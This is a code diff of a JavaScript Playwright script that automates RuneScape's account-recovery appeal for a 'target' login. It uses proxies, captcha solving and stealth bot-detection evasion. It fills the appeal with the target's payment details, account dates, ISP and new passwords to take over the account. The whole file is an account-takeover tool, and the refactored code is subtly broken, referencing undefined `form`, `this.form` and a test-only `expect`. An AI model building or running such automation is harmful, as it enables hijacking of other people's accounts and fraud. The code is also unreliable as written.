@@ -1,138 +1,95 @@
-const { Evasions, Stealth } = require("./playwrightstealth.js");
-const { args } = require("./args.js");
-const { chromium } = require("playwright-extra");
 const { captcha, SolveCaptcha } = require("./captcha.js");
-const RecaptchaPlugin = require("@extra/recaptcha");
-chromium.use(RecaptchaPlugin(captcha));
 
-async function PreForm(form) {
-  const browser = await chromium.launch({
-    headless: false,
-    args: args,
-    //slowMo: 50,
-  });
-
-  const page = await browser.newPage();
-
-  // This is responsible of using puppeteer stealth in playwright.
-  const evasions = await Evasions();
-  const stealth = await Stealth();
-  evasions.forEach((e) => e().onPageCreated(stealth));
-  for (let evasion of stealth.callbacks) {
-    await page.addInitScript(evasion.cb, evasion.a);
-  }
-
+async function SendRequest(page, target) {
+  await FirstPage(page, target);
+  await SecondPage(page, target);
+  await ThirdPage(page, target);
+}
+async function FirstPage(page, target) {
   try {
     await page.goto(
       "https://secure.runescape.com/m=accountappeal/passwordrecovery"
     );
+    await page.waitForNavigation({ timeout: 2000 });
   } catch (error) {
-    console.log(`Proxy down. Target: ${form.login} | Proxy: ${args.proxy}`);
+    console.log(`Proxy down. Target: ${target.login} | Proxy: ${target.proxy}`);
     return;
   }
-  try {
-    await SolveCaptcha();
-    await page.click("id=email");
-    await page.fill("id=email", form.login);
-    await page.click("id=passwordRecovery");
-    await page.waitForSelector("#main-iframe", { timeout: 3000 });
-    await page.waitForSelector("id=main-iframe", { timeout: 3000 });
-    await SolveCaptcha();
-    await page.waitForSelector("id=email", { timeout: 3000 });
-    await page.click("id=email");
-    await page.fill("id=email", form.login);
-    await page.click("id=passwordRecovery");
-    await SolveCaptcha();
-    await page.waitForSelector("#p-account-recovery-identified");
-    await page.click("#l-vista__container > small > a");
-    await page.waitForSelector("id=p-account-recovery-pre-confirmation");
-    await SolveCaptcha();
-    await page.click("#l-vista__container > p:nth-child(5) > a");
-  } catch (error) {
-    throw error;
-  }
+  await SolveCaptcha(page);
+  await page.click("id=email");
+  await page.fill("id=email", form.login);
+  await page.click("id=passwordRecovery");
+  await page.waitForLoadState("networkidle"); // This resolves after 'networkidle'
+  await SolveCaptcha(page);
+  await page.click("#l-vista__container > small > a");
+  await SolveCaptcha(page);
+  await page.click("#l-vista__container > p:nth-child(5) > a");
+  await SolveCaptcha(page);
+  await page.click("#reg_email");
 }
 
-async function FillForm(form) {
+// The form
+async function SecondPage(page, target) {
+  // Passwords
+  await page.click("#add-password");
+  await page.click("#password2");
+  await page.click("#add-password");
+  await page.click("#password3");
   try {
-    await page.waitForSelector("#reg_email", { state: "visible" });
-    await page.hover("#add-password");
-    await page.click("#add-password");
-    await page.waitForSelector("#password2", { state: "visible" });
-    await page.click("#add-password");
-    await page.waitForSelector("#password3", { state: "visible" });
-    await page.click("#norecoveries", { timeout: 500 });
-    await page.hover("#paymenttype");
-    await page.type("#paymenttype", form.paymentMethod);
-    await page.waitForSelector("#subslength", { state: "visible" });
-    await page.hover("#subslength");
-    await page.type("#subslength", form.subLength);
-    await page.hover("#earliestsubsmonth");
-    await page.type("#earliestsubsmonth", form.creationMonth);
-    await page.hover("#earliestsubsyear");
-    await page.type("#earliestsubsyear", form.creationYear);
-    await page.hover("#creationmonth");
-    await page.type("#creationmonth", form.creationMonth);
-    await page.hover("#creationyear");
-    await page.type("#creationyear", form.creationYear);
-    await page.hover("#country_otherinfo");
-    await page.type("#country_otherinfo", form.country);
-    try {
-      await page.waitForSelector("#state_otherinfo", {
-        state: "visible",
-        timeout: 800,
-      });
-      await page.hover("#state_otherinfo", { timeout: 200 });
-      await page.type("#state_otherinfo", form.state, { timeout: 200 });
-    } catch (error) {
-      // Just catch, because target is not from usa, we can still continue.
-    }
-    await page.hover("#reg_email");
-    await page.fill("id=reg_email", form.personalMail);
-    await page.fill("id=reg_email_conf", form.personalMail);
-    await page.fill("id=password1", form.pass1);
-    await page.fill("id=password2", form.pass2);
-    await page.fill("id=password3", form.pass3);
-    await page.fill("id=email", form.paymentmail);
-    await page.fill("id=postcode", form.zipcode);
-    await page.fill("id=isp", form.isp);
-    await page.click("#submit_button");
+    await page.check("#norecoveries");
+    const checked = await page.isChecked("#norecoveries");
+    expect(checked).toBeTruthy();
   } catch (error) {
-    throw error;
+    // Do nothing, account has no recovery questions, it's normal.
   }
-}
 
-async function AfterForm() {
-  await SolveCaptcha();
-  await SolveCaptcha();
-  await page.waitForSelector("#l-vista__container > h1", { state: "visible" });
+  // Payment
+  await page.hover("#paymenttype");
+  await page.type("#paymenttype", this.form.paymentMethod);
+  await page.waitForSelector("#subslength");
+  await page.hover("#subslength");
+  await page.type("#subslength", this.form.subLength);
+  await page.hover("#earliestsubsmonth");
+  await page.type("#earliestsubsmonth", this.form.creationMonth);
+  await page.hover("#earliestsubsyear");
+  await page.type("#earliestsubsyear", this.form.creationYear);
+
+  // Creation date
+  await page.hover("#creationmonth");
+  await page.type("#creationmonth", this.form.creationMonth);
+  await page.hover("#creationyear");
+  await page.type("#creationyear", this.form.creationYear);
+
+  // Country and State
+  await page.hover("#country_otherinfo");
+  await page.type("#country_otherinfo", this.form.country);
+  try {
+    const statefield = page.locator("#state_otherinfo");
+    await statefield.waitFor({ state: "attached", timeout: 800 });
+    await page.hover("#state_otherinfo");
+    await page.type("#state_otherinfo", this.form.state);
+  } catch (error) {
+    // Just catch, because target is not from usa, we can still continue.
+  }
+
+  // Fill the page
+  await page.click("id=reg_email");
+  await page.fill("id=reg_email", form.personalMail);
+  await page.fill("id=reg_email_conf", form.personalMail);
+  await page.fill("id=password1", form.pass1);
+  await page.fill("id=password2", form.pass2);
+  await page.fill("id=password3", form.pass3);
+  await page.fill("id=email", form.paymentmail);
+  await page.fill("id=postcode", form.zipcode);
+  await page.fill("id=isp", form.isp);
+  await page.click("#submit_button");
+}
+// The after form
+async function ThirdPage(page, target) {
+  await SolveCaptcha(page);
+  await page.waitForLoadState("networkidle");
+  console.log(`Recovery sent for ${form.login}`);
   await page.close();
 }
 
-async function Request(form) {
-  try {
-    await PreForm(form);
-  } catch (error) {
-    console.log(error);
-    console.log("Trying again.");
-    await PreForm(form);
-  }
-
-  try {
-    await FillForm(form);
-  } catch (error) {
-    console.log(error);
-    console.log("Trying again.");
-    await FillForm(form);
-  }
-
-  try {
-    await AfterForm();
-  } catch (error) {
-    console.log(error);
-    console.log("Trying again.");
-    await AfterForm();
-  }
-}
-
-module.exports = { Request };
+module.exports = { SendRequest };
